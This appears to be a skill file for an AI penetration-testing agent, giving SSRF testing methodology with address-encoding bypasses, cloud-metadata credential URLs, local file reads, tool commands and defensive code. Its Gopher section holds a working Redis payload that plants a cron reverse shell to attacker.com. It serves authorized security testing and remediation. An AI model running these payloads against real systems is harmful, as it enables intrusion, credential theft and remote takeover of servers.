---
name: ssrf-testing
description: Professional skills and methodology for SSRF (Server-Side Request Forgery) testing
version: 1.0.0
---

# SSRF (Server-Side Request Forgery) Testing

## Overview

SSRF abuses a server's ability to issue requests — enabling internal-resource access, port scanning, or firewall bypass. This skill provides detection, exploitation, and defense methods for SSRF vulnerabilities.

## How it works

An application accepts a URL parameter and fetches it. An attacker controls the request target, causing:
- Internal-resource access
- Local file reading
- Port scanning
- Firewall bypass
- Cloud-metadata access

## Testing methodology

### 1. Identify SSRF input points

**Common features:**
- URL preview/screenshots
- File upload (remote URL)
- Webhook callbacks
- API proxies
- Data import
- Image processing
- PDF generation

### 2. Basic detection

**Test loopback:**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**Test internal IPs:**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**Test the file protocol:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. Bypass techniques

**IP-address encodings:**
```
127.0.0.1 → 2130706433 (decimal)
127.0.0.1 → 0x7f000001 (hex)
127.0.0.1 → 0177.0.0.1 (octal)
```

**DNS-resolution bypass:**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL redirection:**
```
http://attacker.com/redirect → http://127.0.0.1
```

**Protocol confusion:**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## Exploitation techniques

### Internal-network probing

**Port scanning:**
```bash
# With Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**Service identification:**
- Response-time differences
- Error messages
- HTTP status codes
- Response content

### Cloud metadata

**AWS EC2:**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure:**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**Alibaba Cloud:**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### Internal-application attacks

**Reach admin panels:**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Unauthenticated Redis:**
```
http://127.0.0.1:6379
# then send Redis commands
```

**FastCGI attack:**
```
http://127.0.0.1:9000
# abuse the FastCGI protocol to execute commands
```

## Advanced exploitation

### Gopher protocol

**Send arbitrary protocol data:**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis command execution:**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict protocol

**Port scanning and info gathering:**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### File protocol

**Read local files:**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## Tool usage

### SSRFmap

```bash
# Basic scan
python3 ssrfmap.py -r request.txt -p url

# Port scan
python3 ssrfmap.py -r request.txt -p url -m portscan

# Cloud metadata
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# Generate a Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**Detect blind SSRF:**
```
http://burpcollaborator.net
# watch for DNS/HTTP requests
```

## Verification and reporting

### Verification steps

1. Confirm you control the request target
2. Verify internal-resource access or port scanning
3. Assess the impact (internal pivoting, data leakage, etc.)
4. Record a complete PoC
5. Log the confirmed vulnerability via the `report_finding` tool (the platform's sole entry point for recording vulnerabilities), covering location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting essentials

- Vulnerability location and input parameter
- Reachable internal resources or ports
- Complete exploitation steps and PoC
- Remediation advice (URL allowlists, disabling dangerous protocols, etc.)

## Defenses

### Recommended

1. **URL allowlist**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **Disable dangerous protocols**
   - Allow only http/https
   - Block file://, gopher://, dict://, etc.

3. **IP-address filtering**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **DNS-resolution validation**
   - Resolve the hostname to an IP
   - Check whether the IP falls in internal ranges

5. **Network isolation**
   - Restrict server egress
   - Route through a proxy

## Notes

- Test only in authorized environments
- Avoid impacting internal systems
- Mind which protocols are supported
- Watch request rates while testing to avoid tripping defenses
